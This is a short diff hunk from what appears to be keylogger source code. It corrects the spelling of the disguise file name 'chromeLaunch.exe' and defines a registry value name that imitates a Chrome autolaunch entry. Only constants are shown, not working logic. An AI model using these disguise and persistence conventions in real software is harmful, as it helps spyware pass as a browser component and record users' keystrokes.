@@ -12,7 +12,7 @@
 /* Defines */
 #define LOGFILE "log.txt"
 #define OLDFILE "KeyLogger.exe"
-#define NEWFILE "chromeLunch.exe"
+#define NEWFILE "chromeLaunch.exe"
 #define REGISTERY_NAME "ChromeAutoLaunch_9A8B7C6D12E4F9A27B3A7F5C4D9A6B8F2"
 #define KEY_PRESSED 0x8000
 #define CAPSLOCK_MASK 0x0001
